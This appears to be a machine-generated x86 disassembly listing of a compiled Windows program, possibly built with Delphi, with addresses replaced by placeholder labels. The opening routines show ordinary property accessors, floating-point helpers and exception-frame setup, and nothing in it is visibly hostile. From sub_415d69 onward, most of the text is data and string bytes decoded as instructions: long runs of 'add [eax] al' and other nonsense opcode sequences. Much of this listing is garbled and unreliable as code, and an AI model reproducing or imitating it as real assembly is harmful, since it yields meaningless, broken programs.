cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_414fb4 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4150e3 ]
jmp [ eax * 4 + jump_table_415050 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_415178
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
lea edx [ esi + eax ]
mov eax ecx
call sub_415164
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_4151b8
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_415164
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_4151f8
push ebx
push esi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov ebx [ esi + 0x4 ]
cmp [ esi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and ebx 0xffffff
add eax ebx
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
pop esi
pop ebx
retn
jb r-xdata
call ebx
pop esi
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop esi
pop ebx
retn
sub_415238
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_415270
cmp [ edx + 0x7 ] 0xfe
mov ecx [ edx + 0x4 ]
mov edx [ edx + 0x10 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
retn
jb r-xdata
call ecx
retn
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_415298
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_4152d4
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] ecx
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov ebx edx
and ebx 0xffffff
add ebx eax
mov eax [ esp ]
mov edx [ ebx ]
call sub_40588c
jmp r-xdata
mov [ esp + 0x4 ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0x4 ] edx
jmp r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx esi
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
mov edx [ esp ]
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
jmp r-xdata
mov [ esp + 0x8 ] eax
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_415354
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_40588c
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_4153c8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41540e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415415
retn
mov eax rw-data
call sub_404008
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a84
sub_415420
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_415445
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41544c
retn
sub_415d69
inc ebp
pop ebp
inc ecx
add [ ebx + 0x5d ] dl
inc ecx
add [ ebp + 0x5d ] bl
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
imul ebx [ ebp + 0x41 ] 0x800
add [ eax ] al
add [ eax ] al
add [ ebp + 0x5de40040 ] cl
inc ecx
add [ ebp + 0x5d ] dh
inc ecx
add [ eax ] al
add [ eax ] al
add ah dh
pop ebp
inc ecx
add [ eax ] ah
pop esi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
pop esi
inc ecx
add [ eax + eax ] cl
add [ eax ] al
test al 0x5c
inc ecx
add al al
xor al 0x40
add [ eax - 0x2fffbe76 ] dh
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
loopne r-xdata
inc ecx
add al dh
mov [ ecx ] eax
clc
mov [ ecx ] eax
or al 0x89
inc ecx
add [ eax - 0x75 ] al
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] ah
inc eax
add [ eax + eax ] al
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
test al 0x5c
inc ecx
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
pushfd
mov [ ecx ] es
imul esi [ ebx + 0x74 ] 0x20746e65
pop esi
inc ecx
add [ edi ] al
adc eax 0x746e4954
jb r-xdata
add [ edx + esi + 0x40 ] al
add [ esp + ecx * 4 - 0x760fffbf ] bl
inc ecx
add al bh
mov [ ecx ] eax
or al 0x89
inc ecx
add [ eax ] cl
lea eax [ ecx ]
call 0x1841a03a
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
mov es [ ecx ]
adc [ esi - 0x739bffbf ] cl
inc ecx
add [ edx ] al
add bh bh
or [ ebp - 0x7217ffbf ] cl
inc ecx
add [ eax ] bl
imul esi [ ebx + 0x74 ] 0xe4746e65
pop ebp
inc ecx
add [ ebx * 2 + 0x41 ] bl
pop es
inc ebx
insb
popad
jae r-xdata
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcomp [ esi + 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x39ffbea2 ] bh
pop esi
inc ecx
add [ eax + eax ] cl
add [ eax ] al
sub_416014
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fsub [ eax + 0x41 ]
and al 0x11
inc eax
add [ ecx ] al
xor al 0x2f
inc ecx
add al dh
mov [ ecx ] eax
test al 0x95
inc ecx
add [ eax - 0x33ffbe6c ] ah
outsb
jae r-xdata
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4307da82
insb
popad
jae r-xdata
pushad
inc ecx
add [ eax ] dl
add [ eax ] al
add [ eax - 0x3fffbea4 ] ch
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
out dx al
popad
jo r-xdata
inc ecx
add [ eax - 0x61 ] dl
inc ecx
add al bl
lahf
inc ecx
add [ eax - 0x33ffbe60 ] bl
mov eax [ 0xffffffff93a00041 ]
inc ecx
add ah al
xchg ebx eax
inc ecx
add al ch
xchg ebx eax
inc ecx
add ah cl
sub al [ eax ]
int3
add [ ebp + ebx * 4 - 0x6217ffbf ] dh
jae r-xdata
sub al [ eax ]
sub al 0x98
inc ecx
add ah cl
sub al [ eax ]
xor al 0x98
inc ecx
add [ eax + ebx * 4 - 0x624bffbf ] cl
inc ecx
add al ch
popfd
add [ eax - 0x5fffbe6b ] ch
xchg esp eax
inc ecx
add ah cl
jb r-xdata
add ah bh
pushad
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ch
dec [ ebx + 0x41605cc0 ]
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
pushad
inc ecx
inc ecx
pushfd
jae r-xdata
adc [ eax ] eax
add [ edi + ebp ] esi
sub_416120
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
test al 0x95
outsb
dec ecx
je r-xdata
add [ edx + esi + 0x40 ] al
add [ eax - 0x6bffbfce ] al
imul ebp [ esi + 0x67 ] 0x7473694c
xor al 0x62
inc ecx
add [ edi ] al
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
inc ecx
add [ eax - 0x4bffbe6c ] ah
movsb [ edi ] [ esi ]
inc ecx
add al ch
movsb [ edi ] [ esi ]
inc ecx
add ah ch
movsb [ edi ] [ esi ]
inc ecx
add al dh
movsb [ edi ] [ esi ]
inc ecx
add [ eax + ebx * 4 - 0x599bffbf ] cl
inc ecx
add al al
cmpsb [ esi ] [ edi ]
inc ecx
add [ edi - 0x6027ffbf ] dl
inc ecx
add al dl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax + ebp * 4 + 0x41 ] al
add [ eax - 0x5e ] ch
inc ecx
add [ edx + 0x41 ] dh
add al ch
xchg ebx eax
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3500041 ] eax
inc ecx
add [ ebx - 0x67c7ffbf ] bh
inc ecx
add [ ebp + 0x41 ] cl
add ah cl
0x9ba00041 0x41
mov [ ebp - 0x5a67ffbf ] ah
inc ecx
add [ esp + ebx * 4 ] al
inc ecx
add [ eax - 0x64 ] bl
inc ecx
add [ ebx * 4 - 0x6163ffbf ] al
inc ecx
add ah dh
sahf
inc ecx
add [ eax - 0x27ffbe61 ] cl
mov [ 0xffffffffa2f40041 ] al
inc ecx
add ah ch
movsd [ edi ] [ esi ]
inc ecx
add [ esp ] bh
inc ecx
add ah bh
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax + ebp * 4 ] cl
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
xchg ebp eax
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
mov [ ecx + 0x41 ] fs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ah
inc ecx
add [ eax ] dh
add [ eax ] al
add [ eax ] dl
pushad
inc ecx
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
or al 0xa2
inc ecx
add al dh
mov [ ecx ] eax
test al 0x41
add al ah
test al 0x41
xchg esp eax
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
clc
pushad
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
jb r-xdata
jae r-xdata
add [ esp + ebp * 4 + 0x540d0041 ] ch
dec eax
popad
outsb
insb
push ebx
je r-xdata
popad
insd
adc al 0x63
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
arpl [ ecx ] ax
or [ eax ] al
add [ eax ] al
pop eax
bound eax [ ecx ]
shl [ eax + eax * 2 ] 0x0
int3
add al bh
test al 0x41
add ah cl
sub al [ eax ]
int3
add [ ebp + 0x62a40040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
bound eax [ ecx ]
add al 0x0
add [ eax ] al
mov al 0x10
inc eax
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax + ebp * 4 - 0x571fffbf ] dl
inc ecx
push ebx
je r-xdata
popad
insd
mov eax eax
mov [ ebx + 0x41 ] fs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x8004163 ] ch
add [ eax ] al
add al cl
bound eax [ ecx ]
shl [ eax + eax * 2 ] 0x0
int3
insd
dec ebp
insd
outsd
jb r-xdata
popad
insd
add [ ecx + eax * 2 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x64
inc ecx
add [ eax ] dl
add [ eax ] al
add [ eax + 0x62 ] bl
inc ecx
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax + ebp * 4 - 0x571fffbf ] dl
inc ecx
add al bh
test al 0x41
add al ch
scasb [ edi ]
inc ecx
add ah cl
sub al [ eax ]
and [ edi - 0x55e3ffbf ] ch
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
jns r-xdata
push ebx
je r-xdata
sbb al 0xaa
je r-xdata
xchg esp eax
test al 0x41
add al ah
test al 0x41
je r-xdata
outsd
jb r-xdata
insd
popad
insd
jl r-xdata
push ebx
push ebx
inc ecx
add [ eax + esi * 4 ] dl
inc ecx
add [ 0x6d654d54 ] cl
inc ecx
add [ edx + ebp * 4 ] bl
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
outsd
add al bh
test al 0x41
add al ch
scasb [ edi ]
inc ecx
add [ edx + esi * 4 + 0x41 ] bl
add [ eax ] ah
scasd [ edi ]
inc ecx
add [ edx + ebp * 4 ] bl
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
popad
insd
mov eax eax
clc
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x180041 ] dl
add [ eax ] al
mov ah 0x63
inc ecx
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
and al 0xb2
inc ecx
add [ eax + ebp * 4 - 0x571fffbf ] dl
inc ecx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x140041 ] bl
add [ eax ] al
mov ah 0x63
inc ecx
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
inc esp
scasd [ edi ]
inc ecx
add [ eax + ebp * 4 - 0x5017ffbf ] dl
inc ecx
add al bh
test al 0x41
add al ch
scasb [ edi ]
inc ecx
add [ eax + 0x200041b0 ] ah
scasd [ edi ]
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
sub_4162b5
sub al [ eax ]
cwde
test eax 0xaa1c0041
inc ecx
add [ edi ] al
push esp
push ebx
je r-xdata
push ebx
je r-xdata
popad
insd
adc al 0x63
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
arpl [ ecx ] ax
or [ eax ] al
add [ eax ] al
pop eax
bound eax [ ecx ]
shl [ eax + eax * 2 ] 0x0
int3
push ebx
je r-xdata
popad
insd
mov eax eax
mov [ ebx + 0x41 ] fs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x8004163 ] ch
add [ eax ] al
add al cl
bound eax [ ecx ]
shl [ eax + eax * 2 ] 0x0
int3
insd
dec ebp
insd
outsd
jb r-xdata
popad
insd
add [ ecx + eax * 2 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x64
inc ecx
add [ eax ] dl
add [ eax ] al
add [ eax + 0x62 ] bl
inc ecx
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax + ebp * 4 - 0x571fffbf ] dl
inc ecx
add al bh
test al 0x41
add al ch
scasb [ edi ]
inc ecx
add ah cl
sub al [ eax ]
and [ edi - 0x55e3ffbf ] ch
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
jns r-xdata
push ebx
je r-xdata
sbb al 0xaa
je r-xdata
xchg esp eax
test al 0x41
add al ah
test al 0x41
je r-xdata
outsd
jb r-xdata
insd
popad
insd
jl r-xdata
push ebx
push ebx
inc ecx
add [ eax + esi * 4 ] dl
inc ecx
add [ 0x6d654d54 ] cl
inc ecx
add [ edx + ebp * 4 ] bl
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
outsd
add al bh
test al 0x41
add al ch
scasb [ edi ]
inc ecx
add [ edx + esi * 4 + 0x41 ] bl
add [ eax ] ah
scasd [ edi ]
inc ecx
add [ edx + ebp * 4 ] bl
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
popad
insd
mov eax eax
clc
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x180041 ] dl
add [ eax ] al
mov ah 0x63
inc ecx
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
and al 0xb2
inc ecx
add [ eax + ebp * 4 - 0x571fffbf ] dl
inc ecx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x140041 ] bl
add [ eax ] al
mov ah 0x63
inc ecx
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
inc esp
scasd [ edi ]
inc ecx
add [ eax + ebp * 4 - 0x5017ffbf ] dl
inc ecx
add al bh
test al 0x41
add al ch
scasb [ edi ]
inc ecx
add [ eax + 0x200041b0 ] ah
scasd [ edi ]
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
sub_41663c
push ss
inc cx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x18004166 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ecx
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x67 ] bh
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax - 0x3fffbff0 ] dh
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov esp 0xe40041b2
mov dl 0x41
add ah cl
sub al [ eax ]
int3
jb r-xdata
add [ eax ] al
add [ ecx + edx + 0x34c00040 ] ah
inc eax
add ah dh
pop eax
inc eax
add [ eax ] al
pop ecx
inc eax
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] dl
pop ecx
inc eax
add [ edx + esi + 0x40 ] al
add [ edx + edx + 0x42 ] dl
add [ edx + edx + 0x12f40042 ] cl
inc edx
add [ ebx + edx + 0x42 ] bl
add al ah
adc eax [ edx ]
inc esp
adc al 0x42
add [ esi + edx + 0x42 ] al
add [ eax + 0x16 ] dl
inc edx
add [ esi + edx + 0x42 ] bl
add [ eax + 0x16 ] ch
inc edx
add [ esi + edx + 0x42 ] dh
add al dh
push ss
inc edx
add [ esi ] cl
push esp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x66
inc ecx
add [ eax ] bl
or al 0x67
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] cl
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax - 0x3fffbff0 ] dh
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
in al 0x76
inc ecx
add [ esp + edx * 2 ] cl
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
inc esi
imul ebp [ esi + 0x64 ] 0x408d7265
add [ eax + 0x67 ] ch
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_4167f4
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + r--data ] dl
add [ eax ] al
pop es
push esp
push edx
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
rcr [ eax + ebp * 2 + 0x41 ] 0x0
add [ eax ] al
push r--data
add [ eax ] al
sbb al 0x67
inc ecx
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
inc ecx
add ah ah
mov dl 0x41
add ah bl
mov ecx 0xba100041
inc ecx
add [ edi * 4 - 0x44ffffbf ] ah
inc ecx
add [ esp + ebx * 8 ] ch
inc ecx
add [ eax ] ah
mov ebx 0xdcfc0041
inc ecx
add ah ah
fadd [ ecx ]
pushad
0x41
imul esi [ ebp + 0x72 ] 0x68d8c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x4c004168 ] al
add [ eax ] al
add [ edi ] bl
inc ecx
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
